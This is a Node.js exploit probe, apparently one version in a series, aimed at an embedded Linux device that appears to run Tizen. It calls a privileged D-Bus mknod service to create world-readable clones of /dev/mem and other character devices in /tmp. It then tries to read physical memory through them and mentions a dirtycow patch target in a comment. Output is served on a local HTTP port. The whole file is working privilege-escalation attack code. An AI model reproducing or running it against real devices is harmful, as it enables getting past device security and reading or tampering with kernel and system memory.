// v37 - create char devices via CallCommand, check /tmp for created files, try /dev/mem clone
// S_IFCHR=0x2000=8192, S_IFBLK=0x6000=24576
// /dev/mem = char major=1 minor=1, mode=0600 → 8192+384=8576
// /dev/null = char major=1 minor=3, mode=0666 → 8192+438=8630
// /dev/zero = char major=1 minor=5, same mode → 8630
// Pull server: 8120
try {
  var cp = require('child_process');
  var http = require('http');
  var fs = require('fs');
  var res = {};
  var total = 0, done_count = 0;

  function finish(key, val) {
    res[key] = String(val).substring(0, 800);
    done_count++;
    if (done_count >= total) flush();
  }

  function flush() {
    var body = Object.keys(res).map(function(k){ return '[' + k + ']: ' + res[k]; }).join('\n') + '\n=== LIVE ===\n';
    try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe37.txt', body); } catch(e) {}
    var srv = http.createServer(function(req, resp) {
      resp.writeHead(200, {'Content-Type': 'text/plain'});
      resp.end(body);
    });
    srv.listen(8120, '127.0.0.1', function(){});
    srv.on('error', function(){});
    setInterval(function(){}, 60000);
  }

  function dbus(key, dest, path, method, args) {
    total++;
    var cmd = 'dbus-send --system --print-reply --dest=' + dest + ' "' + path + '" ' + method + (args ? ' ' + args : '') + ' 2>&1';
    cp.exec(cmd, {timeout: 10000}, function(err, out) {
      finish(key, out || String(err));
    });
  }

  var MKDEST = 'com.safe.ps_mknod';
  var MKPATH = '/com/safe/ps_mknod';
  var MKIFACE = 'com.safe.ps_mknod';
  var CC = MKIFACE + '.CallCommand';

  // 1. Check if /tmp/m36c was actually created by v36
  total++;
  cp.exec('ls -la /tmp/m36c 2>&1; stat /tmp/m36c 2>&1', {timeout:3000}, function(err,out){
    finish('stat_m36c', out||String(err));
  });

  // 2. Check Smack label on any created file
  total++;
  cp.exec('ls -laZ /tmp/m36c 2>&1 || cat /proc/self/attr/current', {timeout:3000}, function(err,out){
    finish('smack_m36c', out||String(err));
  });

  // 3. Create /dev/mem clone: S_IFCHR|0600 = 8576, major=1, minor=1
  dbus('mk_mem',   MKDEST, MKPATH, CC, 'string:"/tmp/mem37" int32:8576 int32:1 int32:1');
  // Also with 0666 perm: 8192+438=8630
  dbus('mk_mem2',  MKDEST, MKPATH, CC, 'string:"/tmp/mem37b" int32:8630 int32:1 int32:1');

  // 4. Create /dev/null clone (safe reference - known to work on most systems)
  dbus('mk_null',  MKDEST, MKPATH, CC, 'string:"/tmp/null37" int32:8630 int32:1 int32:3');

  // 5. Create /dev/zero clone
  dbus('mk_zero',  MKDEST, MKPATH, CC, 'string:"/tmp/zero37" int32:8630 int32:1 int32:5');

  // 6. After device creation, stat the results
  setTimeout(function() {
    total++;
    cp.exec('ls -laZ /tmp/mem37 /tmp/mem37b /tmp/null37 /tmp/zero37 2>&1', {timeout:3000}, function(err,out){
      finish('stat_created', out||String(err));
    });

    // 7. Try reading from /dev/mem clone
    total++;
    cp.exec('dd if=/tmp/mem37 bs=4 count=1 skip=0 2>&1 | od -t x1z | head', {timeout:5000}, function(err,out){
      finish('read_mem37', out||String(err));
    });

    // 8. Read 16 bytes from physical addr 0 (bootloader region, usually mapped)
    total++;
    cp.exec('od -A x -t x1z -v /tmp/mem37 2>/dev/null | head -4', {timeout:5000}, function(err,out){
      finish('od_mem37', out||String(err));
    });

    // 9. Check if /dev/mem itself is accessible (original)
    total++;
    cp.exec('ls -laZ /dev/mem /dev/kmem 2>&1', {timeout:3000}, function(err,out){
      finish('devmem_orig', out||String(err));
    });

    // 10. Try to open our clone via node's fs.open
    total++;
    try {
      var fd = fs.openSync('/tmp/null37', 'r');
      var buf = Buffer.alloc(4);
      fs.readSync(fd, buf, 0, 4, 0);
      fs.closeSync(fd);
      finish('read_null37', 'opened ok, 4 bytes: ' + buf.toString('hex'));
    } catch(e) {
      finish('read_null37', String(e.code||e.message));
    }

    // 11. Try writing to mem37 at offset 0x7e4b (wasutility patch offset)
    // dirtycow_was target: /bin/wasutility offset 0x7e4b, byte 0xd0->0xe0
    // But first check what physical addr maps to that file in page cache
    // This is too complex; instead just verify open works
    total++;
    try {
      var fdm = fs.openSync('/tmp/mem37', 'r');
      fs.closeSync(fdm);
      finish('open_mem37', 'opened for read');
    } catch(e) {
      finish('open_mem37', 'open failed: ' + String(e.code||e.message));
    }
  }, 12000);

} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe37-crash.txt', String(e.stack||e.message).substring(0,500)); } catch(e2){}
}
